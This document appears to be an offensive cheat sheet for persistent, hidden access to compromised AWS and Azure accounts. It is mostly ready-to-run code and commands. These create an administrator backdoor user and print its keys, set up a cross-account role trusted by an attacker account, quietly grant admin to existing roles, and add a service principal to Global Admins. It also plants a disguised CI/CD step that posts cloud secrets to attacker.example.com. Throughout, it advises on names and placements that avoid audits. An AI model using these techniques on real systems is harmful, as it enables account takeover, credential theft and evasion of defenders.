# Cloud IAM persistence

Establishing persistent access through cloud identity and access management
configurations that survive host-level incident response.

## Enumerate current permissions

Before creating any new entities, understand what is already present:

```text
# AWS: what can the current identity do?
aws sts get-caller-identity
aws iam get-user  # if IAM user
aws iam list-attached-user-policies --user-name CURRENT_USER
aws iam list-attached-role-policies --role-name CURRENT_ROLE
aws iam simulate-principal-policy --policy-source-arn IDENTITY_ARN \
  --action-names iam:CreateUser iam:AttachUserPolicy sts:AssumeRole

# enumerate what other IAM entities exist
aws iam list-users --query 'Users[*].[UserName,CreateDate,PasswordLastUsed]' --output table
aws iam list-roles --query 'Roles[*].[RoleName,CreateDate]' --output table
```

```powershell
# Azure: current identity and permissions
az account show
az role assignment list --all --query '[*].[principalName,roleDefinitionName,scope]' -o table

# list service principals
az ad sp list --all --query '[*].[displayName,appId,createdDateTime]' -o table
```

## Create a backdoor IAM user (AWS)

```python
import boto3, json

iam = boto3.client('iam')

# use a name that blends with existing service accounts
username = 'cloudwatch-metric-exporter'

iam.create_user(UserName=username)
iam.attach_user_policy(
    UserName=username,
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
key = iam.create_access_key(UserName=username)['AccessKey']

print(f"[+] IAM user created: {username}")
print(f"[+] Access Key ID: {key['AccessKeyId']}")
print(f"[+] Secret Access Key: {key['SecretAccessKey']}")

# add to a group rather than direct policy attachment (harder to spot in policy audits)
# iam.add_user_to_group(UserName=username, GroupName='developers')
```

Store credentials outside the compromised environment immediately.

## Create a cross-account role (AWS)

A role with a trust policy allowing assumption from an attacker-controlled account
survives deletion of any IAM user created in the target account:

```python
trust_policy = json.dumps({
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Principal": {"AWS": f"arn:aws:iam::{ATTACKER_ACCOUNT_ID}:root"},
        "Action": "sts:AssumeRole",
        "Condition": {"StringEquals": {"sts:ExternalId": "ops-sync-2024"}}
    }]
})

iam.create_role(
    RoleName='aws-ops-sync-role',
    AssumeRolePolicyDocument=trust_policy,
    Description='AWS Operations Sync Role'
)
iam.attach_role_policy(
    RoleName='aws-ops-sync-role',
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)

print("[+] Cross-account role created")
print(f"[+] Assume from attacker account: aws sts assume-role --role-arn arn:aws:iam::TARGET::role/aws-ops-sync-role --external-id ops-sync-2024 --role-session-name ops")
```

## Attach permissions to existing entity (AWS)

Lower visibility than creating new entities:

```python
# attach admin policy to an existing low-profile role
# target: a role that is used for something mundane (CloudWatch, Lambda, etc.)
target_role = 'lambda-data-processor-role'

iam.attach_role_policy(
    RoleName=target_role,
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)

# or: add an inline policy that allows assuming a specific role
inline_policy = json.dumps({
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Action": "sts:AssumeRole",
        "Resource": "*"
    }]
})
iam.put_role_policy(
    RoleName=target_role,
    PolicyName='ops-integration',
    PolicyDocument=inline_policy
)
```

## Azure service principal backdoor

```python
import subprocess, json

# create a service principal with contributor access
result = subprocess.run(
    ['az', 'ad', 'sp', 'create-for-rbac',
     '--name', 'azure-monitor-connector',
     '--role', 'Contributor',
     '--scopes', f'/subscriptions/{SUBSCRIPTION_ID}',
     '--years', '2'],
    capture_output=True, text=True
)
creds = json.loads(result.stdout)
print(f"appId: {creds['appId']}")
print(f"password: {creds['password']}")
print(f"tenant: {creds['tenant']}")
```

For owner-level access with less visibility, add the service principal to an existing
high-privilege group rather than a direct role assignment:

```python
# add service principal to owners group
group_id = subprocess.run(
    ['az', 'ad', 'group', 'show', '--group', 'Global Admins', '--query', 'id', '-o', 'tsv'],
    capture_output=True, text=True
).stdout.strip()

subprocess.run(['az', 'ad', 'group', 'member', 'add',
                '--group', group_id, '--member-id', sp_object_id])
```

## CI/CD secret injection

If CI/CD pipelines have cloud credentials, modifying the pipeline to exfiltrate or
misuse those credentials is persistent as long as the pipeline runs:

```yaml
# GitHub Actions: add a step to an existing workflow
# the malicious step is buried among legitimate steps
- name: Cache dependency validation
  run: |
    python3 -c "
import os, requests
creds = {k:v for k,v in os.environ.items() if 'AWS' in k or 'AZURE' in k or 'TOKEN' in k}
requests.post('https://attacker.example.com/collect', json=creds, timeout=2)
" 2>/dev/null || true
```

## Verify persistence

```text
# confirm the backdoor access works from a clean environment
AWS_ACCESS_KEY_ID=KEY AWS_SECRET_ACCESS_KEY=SECRET aws sts get-caller-identity
AWS_ACCESS_KEY_ID=KEY AWS_SECRET_ACCESS_KEY=SECRET aws s3 ls

# for cross-account role:
aws sts assume-role \
  --role-arn arn:aws:iam::TARGET_ACCOUNT:role/aws-ops-sync-role \
  --external-id ops-sync-2024 \
  --role-session-name verify \
  --profile attacker-profile
```
